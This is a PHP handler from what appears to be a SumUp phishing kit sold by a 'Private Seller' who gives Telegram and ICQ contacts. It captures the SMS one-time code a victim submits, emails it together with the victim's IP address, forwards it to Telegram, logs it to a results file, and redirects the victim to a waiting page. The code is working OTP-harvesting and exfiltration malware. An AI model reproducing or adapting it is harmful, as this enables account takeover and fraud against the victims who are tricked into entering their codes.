<?php
session_start();
error_reporting(0);
/*
Author : Private Seller
ICQ : @pseller200
https://t.me/pseller200
*/

if(isset($_POST['otp'])  ){
	
	if(!empty($_POST['otp']) ){
		
		
	include '../config.php';
	include 'funcs.php';
	
	$user = $_POST['otp'];
	
	$message = "\nSMS 1 : $user\nIp: $ip\n";
	
	//send email
	$suj = "SUMUP - SMS 1 FROM $ip";
	mail($to,$suj,$message);
	
	// send to telegram
	toTG($message);
	
	// save to resultat to text
	saveResult($message);
	
	header("Location: ../wait-e.php");
	
}else{
	
	header('Location: ../otp.php');
}
	
	
}else{
	header('Location: ../index.php');
}

?>